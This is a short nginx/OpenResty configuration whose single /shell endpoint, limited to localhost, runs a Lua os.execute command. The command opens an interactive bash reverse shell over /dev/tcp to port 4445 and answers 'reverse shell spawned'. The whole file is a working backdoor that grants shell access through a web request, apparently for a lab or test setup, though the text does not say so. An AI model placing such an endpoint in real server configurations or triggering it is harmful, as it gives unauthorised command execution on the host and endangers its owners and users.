server {
    listen 8080;

    location /shell {
        allow 127.0.0.1;
        deny all;
        content_by_lua_block {
            os.execute("setsid /bin/bash -c 'exec 3<>/dev/tcp/127.0.0.1/4445; script -qc \"bash -i\" /dev/null <&3 >&3 2>&3 &'")
            ngx.say("reverse shell spawned")
        }
    }
}   
